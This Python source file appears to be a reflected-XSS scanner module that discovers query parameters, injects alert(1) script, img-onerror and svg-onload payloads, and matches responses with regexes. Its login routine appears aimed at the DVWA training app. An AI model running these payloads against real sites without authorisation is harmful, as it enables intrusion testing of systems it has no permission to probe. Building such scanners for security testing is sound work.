import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from backend.engine.core.base_scanner import BaseScanner


class XSSScanner(BaseScanner):

    PAYLOADS = [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "'><script>alert(1)</script>"
    ]

    PATTERNS = [
        r"<script.*?>",
        r"alert\s*\(",
        r"onerror\s*=",
        r"onload\s*=",
        r"<svg.*?>"
    ]

    COMMON_PARAMS = [
        "q", "s", "search", "query", "name", "input",
        "text", "keyword", "term", "value", "data", "msg"
    ]

    def login(self, session, login_url, username, password):
        login_page = session.get(login_url)
        token = re.search(r"user_token.*?value='(.+?)'", login_page.text)
        user_token = token.group(1) if token else ""
        login_data = {
            "username": username,
            "password": password,
            "Login": "Login",
            "user_token": user_token
        }
        session.post(login_url, data=login_data)
        session.cookies.set("security", "low")

    def recon(self, session):
        discovered = []
        parsed = urlparse(self.target_url)

        existing_params = parse_qs(parsed.query)
        if existing_params:
            discovered.extend(existing_params.keys())
            return discovered

        for param in self.COMMON_PARAMS:
            test_url = f"{self.target_url}?{param}=hello"
            try:
                response = session.get(test_url, timeout=10)
                if "hello" in response.text.lower():
                    discovered.append(param)
            except requests.exceptions.RequestException:
                continue

        return discovered

    def inject_payload(self, url, param, payload):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme,
            parsed.netloc,
            parsed.path,
            parsed.params,
            new_query,
            parsed.fragment
        ))

    def is_vulnerable(self, html, payload):
        html_lower = html.lower()
        payload_lower = payload.lower()
        if payload_lower in html_lower:
            for pattern in self.PATTERNS:
                if re.search(pattern, html, re.IGNORECASE):
                    return pattern
        return None

    def run_scan(self):
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0"
        })

        if hasattr(self, 'credentials'):
            self.login(
                session,
                self.credentials['login_url'],
                self.credentials['username'],
                self.credentials['password']
            )
        elif hasattr(self, 'cookies'):
            session.cookies.update(self.cookies)

        params = self.recon(session)

        if not params:
            return self.format_result(
                vuln_name="Reflected XSS",
                is_vuln=False,
                payload="None",
                steps=[
                    {"action": "Recon", "details": "No parameters discovered"}
                ]
            )

        base_url = self.target_url.split("?")[0]

        for param in params:
            for payload in self.PAYLOADS:
                test_url = self.inject_payload(
                    base_url + "?" + param + "=hello",
                    param,
                    payload
                )
                try:
                    response = session.get(test_url, timeout=10)
                    html = response.text
                    result = self.is_vulnerable(html, payload)
                    if result:
                        return self.format_result(
                            vuln_name="Reflected XSS",
                            is_vuln=True,
                            payload=payload,
                            steps=[
                                {"action": "Recon", "details": f"Discovered parameter: {param}"},
                                {"action": "Parameter Tested", "details": param},
                                {"action": "Payload Sent", "details": payload},
                                {"action": "Reflection Found", "details": "Payload reflected in response"},
                                {"action": "XSS Pattern Detected", "details": result},
                                {"action": "URL Tested", "details": test_url}
                            ]
                        )
                except requests.exceptions.RequestException:
                    continue

        return self.format_result(
            vuln_name="Reflected XSS",
            is_vuln=False,
            payload="None",
            steps=[
                {"action": "Recon", "details": f"Parameters discovered: {params}"},
                {"action": "Completed", "details": "No Reflected XSS detected"}
            ]
        )


if __name__ == "__main__":
    url = input("Enter URL: ").strip()
    use_login = input("Login required? (y/n): ").strip().lower()

    scanner = XSSScanner(url)

    if use_login == "y":
        login_url = input("Enter login URL: ").strip()
        username = input("Enter username: ").strip()
        password = input("Enter password: ").strip()
        scanner.credentials = {
            "login_url": login_url,
            "username": username,
            "password": password
        }
    else:
        cookies_input = input("Enter cookies (press Enter to skip): ").strip()
        cookie_dict = {}
        if cookies_input:
            for cookie in cookies_input.split(";"):
                if "=" in cookie:
                    key, value = cookie.strip().split("=", 1)
                    cookie_dict[key] = value
        scanner.cookies = cookie_dict

    print(scanner.run_scan())